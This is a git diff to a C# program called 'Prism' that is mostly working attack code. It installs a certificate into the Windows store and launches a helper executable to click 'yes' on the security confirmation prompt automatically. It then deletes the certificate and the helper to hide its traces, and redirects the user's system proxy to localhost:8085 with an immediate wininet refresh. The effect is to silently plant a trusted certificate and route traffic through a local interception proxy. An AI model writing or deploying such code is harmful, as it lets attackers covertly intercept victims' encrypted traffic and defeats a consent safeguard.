@@ -9,12 +9,18 @@ using System.Diagnostics;
 using System.IO;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
-
+using System.Runtime.InteropServices;
 
 namespace Prism
 {
     static class Program
     {
+        [DllImport("wininet.dll")]
+        public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
+        public const int INTERNET_OPTION_SETTINGS_CHANGED = 39;
+        public const int INTERNET_OPTION_REFRESH = 37;
+        static bool settingsReturn, refreshReturn;
+        static Process p = new Process();
         static void Main()
         {
             try
@@ -33,24 +39,30 @@ namespace Prism
                 { //Create a new thread in order to bypass the confirmation dialog
                     try
                     {
-                        Thread.Sleep(2000); //Wait for the prompt to appear
-                        Process p = new Process();
                         p.StartInfo.FileName = bypassdlg;
                         p.StartInfo.Arguments = "dlg \" \" \" \" click yes";
+                        Thread.Sleep(2000); //Wait for the prompt to appear
                         p.Start(); //Bypass the prompt
-                    } catch
+                    }
+                    catch
                     {
                         Environment.Exit(0);
                     }
                 }).Start();
                 store.Add(certificate); //Add the certificate to the opened store (this is where the dialog prompts the user)
                 store.Close(); //Close the opened certificate store
+                p.WaitForExit(); //Wait for the bypass to exit before trying deleting it.
                 File.Delete(cert); //Delete the certificate
                 File.Delete(bypassdlg); //Delete the bypass executable
                 RegistryKey reg_key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", true); //Change this line if you want to install the Certificate for all users (it requires UAC Prompt)
-                reg_key.SetValue("ProxyServer","localhost:8085"); //Set the system proxy settings
+                reg_key.SetValue("ProxyServer", "localhost:8085"); //Set the system proxy settings
                 reg_key.SetValue("ProxyEnable", 1);  //Enable the proxy
-            } catch {
+                //This helps to enable the proxy immediately
+                settingsReturn = InternetSetOption(IntPtr.Zero, INTERNET_OPTION_SETTINGS_CHANGED, IntPtr.Zero, 0);
+                refreshReturn = InternetSetOption(IntPtr.Zero, INTERNET_OPTION_REFRESH, IntPtr.Zero, 0);
+            }
+            catch
+            {
                 Environment.Exit(0);
             }
         }
